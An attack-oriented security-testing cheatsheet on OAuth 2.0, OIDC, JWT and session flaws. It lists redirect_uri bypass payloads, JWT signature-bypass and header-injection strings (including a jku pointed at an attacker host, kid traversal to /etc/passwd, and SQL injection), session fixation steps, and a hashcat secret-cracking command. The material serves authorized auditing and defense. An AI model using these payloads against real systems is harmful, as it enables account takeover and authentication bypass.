# OAuth 2.0, JWT & Session Flaws: Deep-Dive Cheatsheet

A technical, attack-oriented reference for auditing OAuth 2.0 flows, JSON Web Tokens (JWT), and modern session management implementations.

---

## Part 1: OAuth 2.0 & OpenID Connect (OIDC) Exploits

### 1. `redirect_uri` Validation Bypass Matrix
OAuth Identity Providers (IdP) validate the `redirect_uri` to prevent leaking authorization codes. Test these parser discrepancy techniques:
- **Wildcard Misconfigurations:**
  - `https://target.com/callback` -> `https://target.com/callback/../../attacker.com`
  - Subdomain takeover: `https://subdomain.target.com/callback` where `subdomain` is unclaimed.
- **Path Traversal & Directory Normalization:**
  - `https://target.com/oauth/callback%2f%2e%2e%2fattacker`
  - `https://target.com/oauth/callback/..;/attacker` (Tomcat / Spring matrix parameter).
- **IDN Homograph & Unicode Encoding:**
  - `https://tаrget.com` (Cyrillic 'а') vs `https://target.com` (Latin 'a').
- **Parameter Pollution & Delimiter Injection:**
  - `https://target.com/callback?url=https://attacker.com`
  - `https://target.com/callback#@attacker.com`
  - `https://target.com/callback%26extra_param=val`

### 2. Authorization Code Stealing via Referer Leaks
If the redirect landing page loads third-party scripts or external resources (e.g., Google Analytics, FontAwesome, external CDN):
- The browser includes `Referer: https://target.com/callback?code=AUTH_CODE_HERE`.
- External domain logs can capture the authorization code before it is redeemed.

### 3. Missing / Static `state` Parameter (OAuth Account Takeover)
- **Vulnerability:** `state` parameter is either absent, static, or predictable across sessions.
- **Exploitation:**
  1. Attacker initiates OAuth flow and intercepts the authorization callback with their own authorization code.
  2. Attacker drops the request and creates an exploit link or CSRF page containing:
     `https://target.com/oauth/callback?code=ATTACKER_CODE`
  3. Victim clicks the link while authenticated. The victim's account is now linked to the attacker's social provider credentials.

---

## Part 2: JSON Web Token (JWT) Exploitation

### 1. Signature Verification Bypasses
- **The `none` Algorithm:**
  - Change `{"alg": "HS256"}` to `{"alg": "none"}` or `{"alg": "None"}` or `{"alg": "NONE"}`.
  - Remove the signature part completely: `header.payload.`.
- **Algorithm Confusion (HMAC vs. RSA):**
  - If the server expects RS256 (public/private key) but accepts HS256:
  - Sign the token with HMAC-SHA256 using the server's public RSA key (in PEM format) as the shared HMAC secret.
- **Null Signature / Empty String Signature:**
  - Submit token with trailing dot: `eyJ...eyJ...`.

### 2. Header Parameter Injection
- **`jwk` (JSON Web Key) Parameter Injection:**
  - Attacker generates their own RSA key pair.
  - Embeds the public key directly inside the JWT header (`"jwk": { ... }`).
  - If the server blindly trusts the header-provided key to verify the token, the forged token is accepted.
- **`jku` (JWK Set URL) Header Injection:**
  - Change `"jku": "https://auth.target.com/.well-known/jwks.json"` to an attacker-controlled server:
    `"jku": "https://attacker.com/fake_jwks.json"`.
  - Test SSRF or path traversal: `"jku": "https://auth.target.com/../../attacker"`.
- **`kid` (Key ID) Parameter Manipulation:**
  - **Directory Traversal:** `"kid": "../../../dev/null"` (empty secret) or `"kid": "../../../etc/passwd"`.
  - **SQL Injection:** `"kid": "key1' UNION SELECT 'my_secret'--"` if key is retrieved via database query.

---

## Part 3: Session Management & Token Fixation

1. **Pre-Session Fixation:**
   - Server assigns a session cookie prior to login.
   - Upon successful authentication, the server retains the same session cookie instead of regenerating a fresh one.
   - Attacker pre-seeds the cookie on a shared device or via CRLF/XSS, and waits for victim login.
2. **Concurrent Login & Session Termination:**
   - Changing user password or triggering 2FA reset fails to invalidate existing active session tokens or refresh tokens.
3. **Session Secret Reuse:**
   - Hardcoded or default JWT signing secrets (e.g., `secret`, `123456`, `jwt_secret`, `password`).
   - Crack secret offline using Hashcat:
     `hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt`
